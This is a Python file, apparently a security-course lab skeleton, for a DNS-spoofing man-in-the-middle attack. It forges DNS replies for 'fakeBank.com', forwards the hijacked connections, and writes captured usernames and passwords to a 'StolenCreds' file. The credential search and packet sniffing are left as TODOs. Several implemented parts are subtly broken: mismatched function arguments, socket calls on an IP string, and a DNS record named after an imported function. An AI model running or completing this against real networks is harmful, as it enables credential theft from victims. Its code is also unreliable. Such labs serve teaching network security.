import os
import argparse
import socket

from dns.resolver import query
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS
from scapy.layers.inet import IP, UDP

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "fakeBank.com"


def resolveHostname(hostname):
    # IP address of HOSTNAME. Used to forward tcp connection.
    # Normally obtained via DNS lookup.
    return "127.1.1.1"


def log_credentials(username, password):
    # Write stolen credentials out to file
    # Do not change this
    with open("lib/StolenCreds.txt", "wb") as fd:
        fd.write("Stolen credentials: username=" + username + " password=" + password)


def check_credentials(client_data):
    # TODO: Take a block of client data and search for username/password credentials
    # If found, log the credentials to the system by calling log_credentials().
    raise NotImplementedError


import socket


def handle_tcp_forwarding(client_socket, client_ip, hostname):
    # Continuously intercept new connections from the client
    # and initiate a connection with the host in order to forward data

    while True:
        connection, client_address = client_socket.accept()
        print(f"New connection from client {client_address}")

        host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host_socket.connect((hostname, 80))
        print(f"Connected to host {hostname}")

        while True:
            data = connection.recv(1024)
            if not data:
                break
            print(f"Received {len(data)} bytes from client {client_address}")

            check_credentials(data)
            host_socket.sendall(data)
            print(f"Sent {len(data)} bytes to host {hostname}")

            if '/post_logout' in data.decode():
                print(f"Received POST to '/post_logout' from client {client_address}. Exiting.")
                break

            data = host_socket.recv(1024)
            if not data:
                break
            print(f"Received {len(data)} bytes from host {hostname}")

            connection.sendall(data)
            print(f"Sent {len(data)} bytes to client {client_address}")

    connection.close()
    host_socket.close()
    print(f"Closed connection with client {client_address} and host {hostname}")


def dns_callback(packet, extra_args):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR) and scapy_packet:
        print(f"Received DNSRR from {scapy_packet.getlayer(DNSRR).qd.qname}")
        if scapy_packet.getlayer(DNSRR).qd.qname != extra_args["hostname"]:
            return
        dns_response = IP(dst=packet[IP].src) / \
                       UDP(dport=packet[UDP].sport, sport=53) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                           an=DNSRR(rrname=query, ttl=10, rdata=extra_args['fake_ip']))

        send(dns_response, verbose=0)
        handle_tcp_forwarding(packet[IP].src, extra_args['fake_ip'], extra_args['target_host'],
                              extra_args['target_port'])



def sniff_and_spoof(source_ip):
    # TODO: Open a socket and bind it to the attacker's IP and WEB_PORT
    # This socket will be used to accept connections from victimized clients

    # TODO: sniff for DNS packets on the network. Make sure to pass source_ip
    # and the socket you created as extra callback arguments.
    print(f"Sniffing for DNS packets on {source_ip}")


def main():
    parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
    parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')

    args = parser.parse_args()
    sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
    # Change working directory to script's dir
    # Do not change this
    abspath = os.path.abspath(__file__)
    dname = os.path.dirname(abspath)
    os.chdir(dname)
    main()
